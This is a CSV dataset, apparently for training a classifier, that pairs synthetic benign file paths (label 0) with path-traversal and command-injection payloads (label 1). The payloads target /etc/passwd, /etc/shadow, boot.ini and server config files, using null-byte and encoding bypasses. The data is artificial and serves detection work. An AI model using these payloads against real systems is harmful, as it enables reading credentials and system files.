Sentence,Label
/safe/path/file417.html,0
%00../../../../../../etc/passwd,1
.\.\.\.\.\.\.\.\.\.\./etc/passwd,1
/safe/path/file1823.html,0
\..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,1
%00/etc/shadow%00,1
/safe/path/file1727.html,0
/safe/path/file1626.html,0
/safe/path/file1770.html,0
/safe/path/file101.html,0
/safe/path/file602.html,0
/safe/path/file643.html,0
C:/boot.ini,1
/safe/path/file384.html,0
/../../../../../../../../../../../etc/passwd%00.html,1
/safe/path/file545.html,0
/safe/path/file358.html,0
/safe/path/file493.html,0
/safe/path/file1313.html,0
/safe/path/file64.html,0
%00/etc/passwd%00,1
../../../../../../../../../../../../boot.ini,1
/safe/path/file1972.html,0
/../../../../../../../../../../etc/passwd^^,1
/safe/path/file452.html,0
../../../../../../../../../../../../etc/shadow,1
/safe/path/file1026.html,0
/safe/path/file498.html,0
C:/inetpub/wwwroot/global.asa,1
/safe/path/file1785.html,0
/..\../..\../..\../..\../..\../..\../etc/shadow,1
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
C:\boot.ini,1
../../../../../../../../../../../../boot.ini,1
/safe/path/file1479.html,0
/safe/path/file1027.html,0
.\.\.\.\.\.\.\.\.\.\./etc/shadow,1
/safe/path/file992.html,0
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,1
/safe/path/file300.html,0
..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
/safe/path/file1456.html,0
/safe/path/file296.html,0
/safe/path/file1137.html,0
..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
../../../../../../../../../../../../boot.ini%00,1
/safe/path/file2.html,0
/safe/path/file1620.html,0
/safe/path/file605.html,0
/safe/path/file826.html,0
..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
/safe/path/file1138.html,0
%00../../../../../../etc/shadow,1
/safe/path/file1741.html,0
.\.\.\.\.\.\.\.\.\.\./etc/shadow,1
/safe/path/file607.html,0
/safe/path/file472.html,0
/safe/path/file306.html,0
/../../../../../../../../%2A,1
C:\inetpub\wwwroot\global.asa,1
%00../../../../../../etc/shadow,1
/safe/path/file1516.html,0
/safe/path/file1743.html,0
/safe/path/file221.html,0
/safe/path/file926.html,0
/safe/path/file1029.html,0
/safe/path/file1365.html,0
/../../../../../../../../../../../boot.ini%00.html,1
/safe/path/file1642.html,0
/safe/path/file1732.html,0
/safe/path/file203.html,0
/safe/path/file1658.html,0
/safe/path/file1133.html,0
/safe/path/file1382.html,0
.\.\.\.\.\.\.\.\.\.\./etc/passwd,1
/..\../..\../..\../..\../..\../..\../etc/shadow,1
/../../../../../../../../../../etc/shadow,1
../../../../../../../../conf/server.xml,1
.\.\.\.\.\.\.\.\.\.\./etc/passwd,1
/safe/path/file1226.html,0
/../../../../../../../../../../etc/shadow,1
/safe/path/file704.html,0
/safe/path/file1967.html,0
..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
/safe/path/file1218.html,0
../../../../../../../../conf/server.xml,1
..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
..\..\..\..\..\..\..\..\..\..\etc\shadow,1
/./././././././././././etc/shadow,1
/safe/path/file1232.html,0
/safe/path/file1898.html,0
/safe/path/file397.html,0
/safe/path/file385.html,0
/safe/path/file785.html,0
.\.\.\.\.\.\.\.\.\.\./etc/passwd,1
../../../../../../../../../../../../etc/shadow,1
/safe/path/file281.html,0
..\..\..\..\..\..\..\..\..\..\etc\shadow,1
/safe/path/file717.html,0
\..\..\..\..\..\..\..\..\..\..\etc\passwd,1
C:/boot.ini,1
/safe/path/file1435.html,0
../../../../../../../../../../../../etc/shadow,1
%00/etc/shadow%00,1
/safe/path/file1915.html,0
/safe/path/file1739.html,0
../../../../../../../../../../../../etc/passwd%00,1
/safe/path/file522.html,0
/safe/path/file1810.html,0
/./././././././././././etc/shadow,1
../../../../../../../../../../../../localstart.asp%00,1
/safe/path/file1371.html,0
/safe/path/file694.html,0
/safe/path/file400.html,0
/../../../../../../../../../../../boot.ini%00.html,1
/safe/path/file1254.html,0
/safe/path/file394.html,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow,1
../../../../../../../../../../../../localstart.asp%00,1
.\.\.\.\.\.\.\.\.\.\./etc/passwd,1
/..\../..\../..\../..\../..\../..\../etc/passwd,1
/safe/path/file1944.html,0
/../../../../../../../../../../etc/shadow,1
/../../../../../../../../../../../boot.ini%00.html,1
/safe/path/file124.html,0
../../../../../../../../../../../../etc/passwd%00,1
/safe/path/file443.html,0
/../../../../../../../../../../etc/passwd,1
/safe/path/file1935.html,0
/./././././././././././boot.ini,1
/safe/path/file323.html,0
C:\inetpub\wwwroot\global.asa,1
/../../../../../../../../../../etc/shadow^^,1
../../../../../../../../../../../../localstart.asp%00,1
/safe/path/file1937.html,0
/..\../..\../..\../..\../..\../..\../etc/shadow,1
C:/boot.ini,1
/safe/path/file1570.html,0
/safe/path/file1586.html,0
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
../../../../../../../../../../../../localstart.asp,1
/safe/path/file612.html,0
../../../../../../../../conf/server.xml,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini,1
/safe/path/file957.html,0
/safe/path/file1086.html,0
/safe/path/file1247.html,0
/../../../../../../../../../../../boot.ini%00.html,1
/safe/path/file414.html,0
%00../../../../../../etc/shadow,1
/safe/path/file1853.html,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
/safe/path/file1873.html,0
../../../../../../../../../../../../etc/hosts%00,1
/safe/path/file1795.html,0
\..\..\..\..\..\..\..\..\..\..\etc\shadow,1
/safe/path/file350.html,0
../../../../../../../../../../../../etc/hosts%00,1
..\..\..\..\..\..\..\..\..\..\etc\shadow,1
/safe/path/file434.html,0
/safe/path/file1459.html,0
../../../../../../../../../../../../localstart.asp%00,1
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd,1
/..\../..\../..\../..\../..\../..\../etc/shadow,1
../../boot.ini,1
/safe/path/file11.html,0
/safe/path/file404.html,0
/safe/path/file1147.html,0
/./././././././././././etc/passwd,1
/../../../../../../../../../../../boot.ini%00.html,1
/safe/path/file1116.html,0
../../../../../../../../../../../../etc/shadow,1
/safe/path/file834.html,0
%00/etc/passwd%00,1
/safe/path/file1867.html,0
/../../../../../../../../bin/id|,1
C:/boot.ini,1
../../../../../../../../conf/server.xml,1
/../../../../../../../../../../etc/shadow^^,1
/safe/path/file1112.html,0
/safe/path/file381.html,0
/safe/path/file1617.html,0
/safe/path/file427.html,0
/safe/path/file269.html,0
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,1
/safe/path/file922.html,0
/safe/path/file531.html,0
C:\inetpub\wwwroot\global.asa,1
/safe/path/file440.html,0
../../../../../../../../../../../../boot.ini,1
/safe/path/file1990.html,0
/safe/path/file680.html,0
/safe/path/file1508.html,0
/safe/path/file199.html,0
/safe/path/file611.html,0
../../../../../../../../../../../../boot.ini,1
/safe/path/file1330.html,0
/safe/path/file315.html,0
/..\../..\../..\../..\../..\../..\../etc/passwd,1
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,1
/../../../../../../../../bin/id|,1
/safe/path/file1670.html,0
../../../../../../../../../../../../localstart.asp%00,1
/safe/path/file1838.html,0
/safe/path/file416.html,0
/safe/path/file1934.html,0
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,1
/../../../../../../../../../../etc/shadow^^,1
/safe/path/file448.html,0
/safe/path/file1353.html,0
/safe/path/file1544.html,0
/../../../../../../../../../../etc/passwd^^,1
/./././././././././././etc/shadow,1
/safe/path/file188.html,0
../../../../../../../../../../../../etc/shadow%00,1
C:\boot.ini,1
/safe/path/file970.html,0
/./././././././././././etc/shadow,1
/safe/path/file1831.html,0
/../../../../../../../../../../etc/passwd^^,1
/safe/path/file854.html,0
/safe/path/file1431.html,0
/safe/path/file1724.html,0
/safe/path/file1865.html,0
.\.\.\.\.\.\.\.\.\.\./etc/passwd,1
/../../../../../../../../../../etc/shadow,1
\..\..\..\..\..\..\..\..\..\..\etc\shadow,1
../../../../../../../../../../../../etc/shadow%00,1
..\..\..\..\..\..\..\..\..\..\etc\passwd,1
/../../../../../../../../../../../etc/passwd%00.jpg,1
/safe/path/file1938.html,0
/safe/path/file1846.html,0
/../../../../../../../../../../etc/passwd,1
/../../../../../../../../%2A,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini,1
C:/boot.ini,1
/safe/path/file638.html,0
/safe/path/file1193.html,0
/safe/path/file1596.html,0
/../../../../../../../../../../etc/shadow^^,1
/./././././././././././boot.ini,1
/safe/path/file737.html,0
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,1
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
\&apos;/bin/cat%20/etc/passwd\&apos;,1
.\.\.\.\.\.\.\.\.\.\./etc/shadow,1
.\.\.\.\.\.\.\.\.\.\./etc/passwd,1
/safe/path/file1572.html,0
/safe/path/file1537.html,0
/safe/path/file180.html,0
/safe/path/file220.html,0
%00/etc/passwd%00,1
../../../../../../../../../../../../localstart.asp%00,1
/../../../../../../../../../../etc/shadow^^,1
../../../../../../../../../../../../localstart.asp%00,1
..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini,1
/safe/path/file1475.html,0
%00../../../../../../etc/passwd,1
/safe/path/file571.html,0
../../../../../../../../conf/server.xml,1
/safe/path/file1771.html,0
/safe/path/file559.html,0
..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
/safe/path/file179.html,0
/safe/path/file1076.html,0
%00/etc/shadow%00,1
/safe/path/file1400.html,0
../../../../../../../../../../../../etc/shadow,1
../../../../../../../../../../../../etc/passwd%00,1
/../../../../../../../../../../../etc/passwd%00.jpg,1
../../../../../../../../../../../../etc/shadow%00,1
C:\boot.ini,1
/../../../../../../../../../../etc/passwd^^,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow,1
/safe/path/file1595.html,0
/safe/path/file1369.html,0
/.../.../.../.../.../,1
/safe/path/file1608.html,0
/safe/path/file1000.html,0
/safe/path/file1659.html,0
\..\..\..\..\..\..\..\..\..\..\etc\shadow,1
/safe/path/file89.html,0
/safe/path/file1749.html,0
/safe/path/file1462.html,0
/safe/path/file656.html,0
/safe/path/file874.html,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
/safe/path/file59.html,0
../../../../../../../../../../../../etc/hosts,1
/./././././././././././etc/passwd,1
/safe/path/file1519.html,0
../../boot.ini,1
/../../../../../../../../../../../etc/passwd%00.jpg,1
/safe/path/file914.html,0
/safe/path/file844.html,0
/safe/path/file1034.html,0
/safe/path/file954.html,0
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
/safe/path/file1952.html,0
/safe/path/file1750.html,0
\..\..\..\..\..\..\..\..\..\..\etc\shadow,1
/safe/path/file1850.html,0
.\.\.\.\.\.\.\.\.\.\./etc/shadow,1
/safe/path/file380.html,0
../../../../../../../../../../../../boot.ini,1
/safe/path/file540.html,0
/safe/path/file1293.html,0
/safe/path/file1774.html,0
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,1
/..\../..\../..\../..\../..\../..\../etc/shadow,1
%0a/bin/cat%20/etc/passwd,1
/../../../../../../../../../../etc/shadow,1
/..\../..\../..\../..\../..\../..\../etc/shadow,1
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
/safe/path/file1429.html,0
%0a/bin/cat%20/etc/shadow,1
/./././././././././././etc/passwd,1
/safe/path/file153.html,0
/safe/path/file474.html,0
../../../../../../../../../../../../etc/hosts%00,1
../../../../../../../../../../../../localstart.asp,1
/safe/path/file847.html,0
/safe/path/file581.html,0
..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
/../../../../../../../../../../../boot.ini,1
/safe/path/file458.html,0
/safe/path/file1188.html,0
/safe/path/file579.html,0
/safe/path/file105.html,0
/.../.../.../.../.../,1
/../../../../../../../../../../etc/passwd^^,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
/safe/path/file1563.html,0
/../../../../../../../../../../etc/passwd^^,1
/../../../../../../../../bin/id|,1
/../../../../../../../../../../../boot.ini%00.jpg,1
..\..\..\..\..\..\..\..\..\..\etc\shadow,1
..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
../../../../../../../../conf/server.xml,1
../../../../../../../../../../../../localstart.asp,1
/.../.../.../.../.../,1
/safe/path/file1216.html,0
/safe/path/file1660.html,0
/safe/path/file413.html,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini,1
/safe/path/file810.html,0
/safe/path/file447.html,0
/safe/path/file129.html,0
/safe/path/file1299.html,0
/safe/path/file462.html,0
../../../../../../../../../../../../etc/shadow%00,1
/../../../../../../../../../../../etc/passwd%00.jpg,1
/safe/path/file700.html,0
/../../../../../../../../../../etc/shadow^^,1
\..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
../../../../../../../../../../../../localstart.asp%00,1
/safe/path/file1883.html,0
.\.\.\.\.\.\.\.\.\.\./etc/passwd,1
/../../../../../../../../../../etc/passwd^^,1
/safe/path/file275.html,0
..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
\..\..\..\..\..\..\..\..\..\..\etc\passwd,1
/safe/path/file693.html,0
../../../../../../../../../../../../etc/hosts,1
..\..\..\..\..\..\..\..\..\..\etc\passwd,1
/safe/path/file1155.html,0
..\..\..\..\..\..\..\..\..\..\etc\passwd,1
../../../../../../../../conf/server.xml,1
/safe/path/file167.html,0
/safe/path/file1713.html,0
/../../../../../../../../../../etc/passwd,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
/safe/path/file173.html,0
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
/safe/path/file940.html,0
C:\inetpub\wwwroot\global.asa,1
/safe/path/file739.html,0
/safe/path/file344.html,0
/safe/path/file660.html,0
/safe/path/file1919.html,0
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,1
/safe/path/file1775.html,0
/safe/path/file1975.html,0
/safe/path/file1618.html,0
\&apos;/bin/cat%20/etc/passwd\&apos;,1
/safe/path/file1316.html,0
..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
.\.\.\.\.\.\.\.\.\.\./etc/passwd,1
.\.\.\.\.\.\.\.\.\.\./etc/passwd,1
/../../../../../../../../../../../boot.ini%00.jpg,1
/../../../../../../../../../../../boot.ini%00.html,1
/../../../../../../../../bin/id|,1
/safe/path/file933.html,0
\&apos;/bin/cat%20/etc/passwd\&apos;,1
/safe/path/file335.html,0
C:/inetpub/wwwroot/global.asa,1
/safe/path/file1014.html,0
/safe/path/file333.html,0
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,1
/safe/path/file1327.html,0
/safe/path/file1496.html,0
/safe/path/file668.html,0
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,1
/../../../../../../../../../../etc/shadow^^,1
/safe/path/file1103.html,0
/./././././././././././etc/shadow,1
../../../../../../../../conf/server.xml,1
/safe/path/file1976.html,0
/safe/path/file1552.html,0
/safe/path/file1045.html,0
/safe/path/file430.html,0
..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini,1
/safe/path/file1430.html,0
/../../../../../../../../../../../etc/passwd%00.jpg,1
/safe/path/file1485.html,0
/safe/path/file1960.html,0
/../../../../../../../../../../etc/shadow,1
/safe/path/file1109.html,0
%0a/bin/cat%20/etc/shadow,1
/safe/path/file1301.html,0
../../../../../../../../../../../../etc/passwd%00,1
/safe/path/file681.html,0
/safe/path/file789.html,0
/../../../../../../../../../../../boot.ini,1
/../../../../../../../../../../../boot.ini,1
/../../../../../../../../../../../boot.ini%00.jpg,1
/safe/path/file223.html,0
/safe/path/file426.html,0
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,1
/../../../../../../../../../../etc/passwd^^,1
/safe/path/file211.html,0
/safe/path/file1822.html,0
/../../../../../../../../../../etc/passwd^^,1
\..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
/safe/path/file552.html,0
/../../../../../../../../../../../etc/passwd%00.html,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
\..\..\..\..\..\..\..\..\..\..\etc\shadow,1
/../../../../../../../../../../etc/shadow,1
/../../../../../../../../../../etc/passwd,1
C:/inetpub/wwwroot/global.asa,1
/safe/path/file495.html,0
/safe/path/file102.html,0
C:\boot.ini,1
/safe/path/file336.html,0
/../../../../../../../../bin/id|,1
/safe/path/file1072.html,0
/../../../../../../../../../../../boot.ini,1
/safe/path/file542.html,0
..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
/safe/path/file876.html,0
/safe/path/file1765.html,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
/safe/path/file141.html,0
/safe/path/file1461.html,0
\..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
%00/etc/shadow%00,1
/safe/path/file1170.html,0
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
/../../../../../../../../../../etc/shadow,1
/safe/path/file198.html,0
/./././././././././././etc/shadow,1
../../../../../../../../../../../../boot.ini%00,1
../../../../../../../../conf/server.xml,1
/safe/path/file1304.html,0
/safe/path/file370.html,0
/safe/path/file1704.html,0
/safe/path/file938.html,0
%00../../../../../../etc/shadow,1
/safe/path/file1013.html,0
/safe/path/file1921.html,0
../../../../../../../../../../../../localstart.asp,1
C:\boot.ini,1
../../../../../../../../../../../../etc/passwd,1
/..\../..\../..\../..\../..\../..\../etc/passwd,1
/safe/path/file1996.html,0
../../../../../../../../../../../../etc/passwd,1
/safe/path/file1021.html,0
%00/etc/passwd%00,1
/safe/path/file759.html,0
..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini,1
/..\../..\../..\../..\../..\../..\../etc/passwd,1
/safe/path/file615.html,0
../../../../../../../../../../../../localstart.asp,1
/safe/path/file1793.html,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
/safe/path/file1121.html,0
/safe/path/file1722.html,0
\..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
.\.\.\.\.\.\.\.\.\.\./etc/shadow,1
../../../../../../../../../../../../etc/shadow%00,1
/safe/path/file1982.html,0
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,1
/safe/path/file567.html,0
../../../../../../../../../../../../localstart.asp%00,1
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,1
../../../../../../../../../../../../etc/passwd,1
../../../../../../../../../../../../etc/hosts%00,1
C:\boot.ini,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini,1
C:\inetpub\wwwroot\global.asa,1
/../../../../../../../../../../../boot.ini,1
/safe/path/file1390.html,0
/safe/path/file803.html,0
/safe/path/file399.html,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
/..\../..\../..\../..\../..\../..\../etc/passwd,1
../../../../../../../../../../../../localstart.asp%00,1
/safe/path/file374.html,0
/safe/path/file486.html,0
/safe/path/file431.html,0
/safe/path/file1255.html,0
/safe/path/file881.html,0
/safe/path/file784.html,0
/../../../../../../../../%2A,1
/.../.../.../.../.../,1
/safe/path/file76.html,0
..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini,1
/safe/path/file633.html,0
/safe/path/file1866.html,0
/safe/path/file1746.html,0
%0a/bin/cat%20/etc/passwd,1
../../../../../../../../../../../../etc/hosts%00,1
../../../../../../../../../../../../boot.ini%00,1
/safe/path/file489.html,0
.\.\.\.\.\.\.\.\.\.\./etc/shadow,1
../../boot.ini,1
/safe/path/file1363.html,0
C:\inetpub\wwwroot\global.asa,1
/safe/path/file1923.html,0
%0a/bin/cat%20/etc/passwd,1
../../../../../../../../../../../../etc/shadow%00,1
/safe/path/file799.html,0
%00/etc/shadow%00,1
\&apos;/bin/cat%20/etc/passwd\&apos;,1
/./././././././././././boot.ini,1
/safe/path/file1888.html,0
%00../../../../../../etc/passwd,1
/safe/path/file711.html,0
/safe/path/file942.html,0
/safe/path/file298.html,0
%00/etc/passwd%00,1
/safe/path/file1302.html,0
/safe/path/file866.html,0
/../../../../../../../../../../../etc/passwd%00.html,1
.\.\.\.\.\.\.\.\.\.\./etc/passwd,1
/./././././././././././boot.ini,1
%0a/bin/cat%20/etc/shadow,1
/../../../../../../../../../../../etc/passwd%00.html,1
/safe/path/file683.html,0
../../../../../../../../../../../../etc/shadow%00,1
/safe/path/file1129.html,0
/safe/path/file1509.html,0
/safe/path/file527.html,0
..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
/../../../../../../../../../../../boot.ini,1
/../../../../../../../../../../../boot.ini,1
/safe/path/file672.html,0
..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini,1
/safe/path/file1872.html,0
/safe/path/file897.html,0
/./././././././././././etc/shadow,1
../../../../../../../../../../../../etc/shadow,1
/safe/path/file512.html,0
/safe/path/file1146.html,0
../../../../../../../../../../../../etc/passwd,1
/safe/path/file1521.html,0
/safe/path/file1845.html,0
/.../.../.../.../.../,1
/safe/path/file511.html,0
/safe/path/file734.html,0
%00../../../../../../etc/passwd,1
../../../../../../../../../../../../boot.ini%00,1
/safe/path/file20.html,0
/safe/path/file295.html,0
/./././././././././././etc/passwd,1
/safe/path/file170.html,0
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
/safe/path/file1989.html,0
\..\..\..\..\..\..\..\..\..\..\etc\shadow,1
/safe/path/file987.html,0
.\.\.\.\.\.\.\.\.\.\./etc/shadow,1
/safe/path/file1274.html,0
/safe/path/file662.html,0
/.../.../.../.../.../,1
%00/etc/passwd%00,1
/safe/path/file321.html,0
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,1
..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
/safe/path/file1691.html,0
/safe/path/file395.html,0
/./././././././././././boot.ini,1
\&apos;/bin/cat%20/etc/passwd\&apos;,1
..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
%00../../../../../../etc/shadow,1
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd,1
../../../../../../../../../../../../etc/passwd%00,1
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,1
/safe/path/file283.html,0
/safe/path/file1490.html,0
%00../../../../../../etc/shadow,1
/safe/path/file1119.html,0
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
../../../../../../../../../../../../etc/shadow%00,1
/safe/path/file1251.html,0
/safe/path/file348.html,0
/safe/path/file1924.html,0
/safe/path/file772.html,0
/safe/path/file1905.html,0
\..\..\..\..\..\..\..\..\..\..\etc\shadow,1
/safe/path/file513.html,0
../../../../../../../../../../../../etc/shadow,1
/../../../../../../../../../../../boot.ini%00.html,1
/safe/path/file1454.html,0
../../../../../../../../../../../../boot.ini%00,1
/safe/path/file1019.html,0
/safe/path/file1876.html,0
/safe/path/file958.html,0
../../boot.ini,1
/../../../../../../../../../../etc/passwd^^,1
/safe/path/file1773.html,0
/safe/path/file236.html,0
.\.\.\.\.\.\.\.\.\.\./etc/shadow,1
/safe/path/file39.html,0
..\..\..\..\..\..\..\..\..\..\etc\shadow,1
/safe/path/file797.html,0
/safe/path/file1325.html,0
../../../../../../../../../../../../etc/hosts%00,1
/safe/path/file1084.html,0
/../../../../../../../../../../../boot.ini,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
../../../../../../../../conf/server.xml,1
/safe/path/file946.html,0
/safe/path/file83.html,0
../../../../../../../../../../../../boot.ini,1
/safe/path/file439.html,0
../../../../../../../../conf/server.xml,1
/safe/path/file1495.html,0
../../../../../../../../../../../../etc/hosts%00,1
../../../../../../../../../../../../etc/passwd%00,1
\..\..\..\..\..\..\..\..\..\..\etc\passwd,1
/safe/path/file1311.html,0
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,1
%0a/bin/cat%20/etc/shadow,1
.\.\.\.\.\.\.\.\.\.\./etc/passwd,1
/safe/path/file1542.html,0
..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
/safe/path/file1184.html,0
../../../../../../../../../../../../boot.ini,1
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
%0a/bin/cat%20/etc/passwd,1
/.../.../.../.../.../,1
/safe/path/file825.html,0
..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
/safe/path/file314.html,0
/safe/path/file1778.html,0
/safe/path/file944.html,0
/safe/path/file893.html,0
/safe/path/file887.html,0
C:/boot.ini,1
%00../../../../../../etc/shadow,1
